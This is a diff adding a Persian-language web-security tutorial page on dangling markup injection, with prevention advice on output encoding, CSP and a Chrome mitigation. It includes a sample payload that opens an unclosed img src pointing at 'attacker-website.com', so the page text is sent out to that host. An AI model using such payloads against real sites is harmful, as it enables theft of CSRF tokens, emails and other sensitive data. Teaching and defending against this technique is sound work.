@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="fa" direction="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Title for SEO --> <!-- the whole site is written by مجتبی -->
+    <title>Dangling Markup Injection - تزریق نشانه‌گذاری معلق | آموزش امنیت وب</title>
+    
+    <!-- Meta description for SEO -->
+    <meta name="description" content="آموزش جامع تزریق نشانه‌گذاری معلق و تکنیک‌های پیشرفته نفوذ در وب‌سایت‌ها. یادگیری چگونگی استخراج داده‌های حساس از طریق حملات نشانه‌گذاری معلق و راه‌های مقابله با آن.">
+    
+    <!-- Meta keywords for SEO -->
+    <meta name="keywords" content="Dangling Markup Injection, تزریق نشانه‌گذاری معلق, XSS, web security, cybersecurity, data extraction, امنیت وب, حملات وب, penetration testing">
+    
+    <!-- Open Graph Meta Tags for better social sharing -->
+    <meta property="og:title" content="Dangling Markup Injection - تزریق نشانه‌گذاری معلق | آموزش امنیت وب">
+    <meta property="og:description" content="آموزش جامع تزریق نشانه‌گذاری معلق و تکنیک‌های پیشرفته نفوذ در وب‌سایت‌ها. یادگیری چگونگی استخراج داده‌های حساس از طریق حملات نشانه‌گذاری معلق و راه‌های مقابله با آن.">
+    <meta property="og:image" content="https://nightmareshadow4exploit.github.io/Resistance/logo.png">
+    <meta property="og:url" content="https://nightmareshadow4exploit.github.io/Resistance/Knowledge/Web%20Hacking/">
+    <meta property="og:type" content="website">
+    
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Nightmare">
+    <meta name="twitter:description" content="یادگیری آزمایش نفوذ وب‌سایت و امنیت سایبری از Nightmare. آموزش نحوه نفوذ و محافظت از وب‌سایت‌ها با جدیدترین روش‌ها و تکنیک‌ها.">
+    <meta name="twitter:image" content="https://nightmareshadow4exploit.github.io/Resistance/logo.png">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Vazir&display=swap" rel="stylesheet">
+
+    <!-- Link to your custom CSS -->
+    <link rel="stylesheet" href="style.css">
+    
+    <!-- JSON-LD Structured Data for the Course -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Course",
+        "name": "Dangling Markup Injection - تزریق نشانه‌گذاری معلق",
+        "description": "آموزش جامع تزریق نشانه‌گذاری معلق و تکنیک‌های پیشرفته نفوذ در وب‌سایت‌ها. این دوره شامل آموزش چگونگی استخراج داده‌های حساس از طریق حملات نشانه‌گذاری معلق و راه‌های مقابله با آن می‌باشد.",
+        "provider": {
+            "@type": "Organization",
+            "name": "Nightmare",
+            "url": "https://nightmareshadow4exploit.github.io/Resistance/",
+            "logo": "https://nightmareshadow4exploit.github.io/Resistance/logo.png"
+        },
+        "courseMode": "Online",
+        "educationalCredentialAwarded": "Certificate of Completion",
+        "offers": {
+            "@type": "Offer",
+            "url": "https://nightmareshadow4exploit.github.io/Resistance/Knowledge/Web%20Hacking/",
+            "priceCurrency": "IRR",
+            "price": "Free",
+            "availability": "https://schema.org/InStock"
+        },
+        "audience": {
+            "@type": "Audience",
+            "audienceType": "Ethical Hackers, Cybersecurity Enthusiasts"
+        },
+        "image": "https://nightmareshadow4exploit.github.io/Resistance/logo.png"
+    }
+    </script>
+</head>
+
+<body>
+    <div class="page-links">
+        <a href="https://nightmareshadow4exploit.github.io/Resistance" class="link home-link">Home</a>
+        <a href="https://t.me/Nightmare_Indian_Hacker" class="link telegram-link">Telegram</a>
+        <a href="https://nightmareshadow4exploit.github.io/Resistance/Knowledge/Web%20Hacking/index.html" class="link index-link">Index</a>
+    </div>
+    <div class="section theme-white">
+
+        <h1 class="heading-2">تزریق نشانه‌گذاری معلق</h1><p>
+            در این بخش، ما توضیح می‌دهیم که تزریق نشانه‌گذاری معلق چیست، چگونه یک بهره‌برداری معمولی کار می‌کند و چگونه می‌توان از این نوع حملات جلوگیری کرد.
+        </p><h2 id="what-is-dangling-markup-injection">تزریق نشانه‌گذاری معلق چیست؟</h2><p>
+            تزریق نشانه‌گذاری معلق تکنیکی برای به دست آوردن داده‌ها از دامنه‌های دیگر است، در مواردی که یک حمله کامل XSS امکان‌پذیر نیست.
+        </p><p>
+            فرض کنید یک برنامه داده‌های کنترل‌شده توسط مهاجم را به صورت ناامن در پاسخ‌های خود قرار می‌دهد:
+        </p><code class="code-scrollable">&lt;input type="text" name="input" value="CONTROLLABLE DATA HERE</code><p>
+            همچنین فرض کنید که برنامه کاراکترهای <code>&gt;</code> یا <code>"</code> را فیلتر یا فرار نمی‌دهد. یک مهاجم می‌تواند از نحو زیر برای خروج از مقدار ویژگی نقل‌شده و تگ محصورکننده استفاده کند و به یک زمینه HTML بازگردد:
+        </p><code class="code-scrollable">"&gt;</code><p>
+            در این شرایط، یک مهاجم به طور طبیعی سعی خواهد کرد که XSS را اجرا کند. اما فرض کنید که حمله XSS معمولی امکان‌پذیر نیست، به دلیل فیلترهای ورودی، سیاست امنیتی محتوا، یا موانع دیگر. در اینجا، ممکن است همچنان بتوان حمله تزریق نشانه‌گذاری معلق را با استفاده از پیلودی مانند مورد زیر انجام داد:
+        </p><code class="code-scrollable">"&gt;&lt;img src='//attacker-website.com?</code><p>
+            این پیلود یک تگ <code>img</code> ایجاد کرده و شروع یک ویژگی <code>src</code> را که حاوی یک URL در سرور مهاجم است، تعریف می‌کند. توجه داشته باشید که پیلود مهاجم ویژگی <code>src</code> را نمی‌بندد و آن را "معلق" می‌گذارد. هنگامی که مرورگر پاسخ را تجزیه می‌کند، تا زمانی که به یک علامت نقل قول منفرد برسد، به دنبال بسته شدن ویژگی خواهد بود. همه چیز تا آن کاراکتر به عنوان بخشی از URL در نظر گرفته شده و در قالب کوئری به سرور مهاجم ارسال خواهد شد. هر کاراکتر غیر الفبایی، از جمله خطوط جدید، URL-encode خواهد شد.
+        </p><p>
+            نتیجه این حمله این است که مهاجم می‌تواند بخشی از پاسخ برنامه را که پس از نقطه تزریق قرار دارد، ضبط کند، که ممکن است شامل داده‌های حساس باشد. بسته به عملکرد برنامه، این داده‌ها ممکن است شامل توکن‌های CSRF، پیام‌های ایمیل، یا داده‌های مالی باشند.
+        </p><p>
+            هر ویژگی‌ای که درخواست خارجی انجام دهد می‌تواند برای نشانه‌گذاری معلق مورد استفاده قرار گیرد.
+        </p><p>
+			آزمایشگاه بعدی حل این چالش را دشوار می‌کند زیرا تمام درخواست‌های خارجی مسدود شده‌اند. با این حال، برخی تگ‌ها به شما این امکان را می‌دهند که داده‌ها را ذخیره کرده و بعداً از یک سرور خارجی بازیابی کنید. حل این آزمایشگاه ممکن است به تعامل کاربر نیاز داشته باشد.
+		</p>
+
+<h2 id="how-to-prevent-dangling-markup-attacks">چگونه از حملات نشانه‌گذاری معلق جلوگیری کنیم</h2><p>
+            شما می‌توانید با استفاده از همان دفاع‌های کلی برای <a href="preventing.html">جلوگیری از XSS</a>، با رمزگذاری داده‌ها در خروجی و اعتبارسنجی ورودی در هنگام دریافت، از این نوع حملات جلوگیری کنید.
+        </p><p>
+            همچنین می‌توانید برخی از حملات نشانه‌گذاری معلق را با استفاده از <a href="content-security-policy.html">سیاست امنیتی محتوا</a> (CSP) کاهش دهید. برای مثال، می‌توانید برخی (اما نه همه) حملات را با استفاده از سیاستی که بارگیری منابع خارجی توسط تگ‌هایی مانند <code>img</code> را ممنوع می‌کند، مسدود کنید.
+        </p><div class="highlightedarea"> 
+     <h4>توجه</h4> 
+        <p>
+            مرورگر کروم تصمیم گرفته است که با جلوگیری از تعریف URLهایی که شامل کاراکترهای خامی مانند براکت‌های زاویه‌دار و خطوط جدید هستند، حملات نشانه‌گذاری معلق را مسدود کند. این امر باعث جلوگیری از حملات خواهد شد، زیرا داده‌هایی که در غیر این صورت ضبط می‌شدند، معمولاً شامل این کاراکترهای خام هستند و بنابراین حمله مسدود خواهد شد.
+        </p>
+    </div>
+
+    
+    </div>
+
+<div class="navigation-links">
+  <a href="exploiting.html" class="prev">« Previous</a>
+    <a href="../../../index.html" class="index">Index</a>
+    <a href="contexts.html"  class="next">Next »</a>
+</div>
+</body>
+</html>
